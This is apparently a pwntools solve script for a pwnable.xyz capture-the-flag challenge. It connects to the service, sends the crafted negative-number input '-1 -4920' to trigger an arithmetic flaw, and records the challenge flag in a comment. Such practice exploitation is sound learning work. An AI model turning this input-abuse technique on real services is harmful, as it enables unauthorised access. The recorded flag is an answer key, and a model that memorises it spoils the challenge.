from pwn import *

HOST, PORT = "svc.pwnable.xyz", 30001
EXE = "./challenge"
gs = """
    break _start
    continue
"""

def start():
    if args.GDB:
        return gdb.debug(EXE, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(EXE)

# ========== Exploit script here ==========
if __name__ == '__main__':
    elf = context.binary = ELF(EXE)
    io = start()

    io.sendlineafter(b': ', b'-1 -4920')

    io.interactive()

# Flag: FLAG{sub_neg_==_add}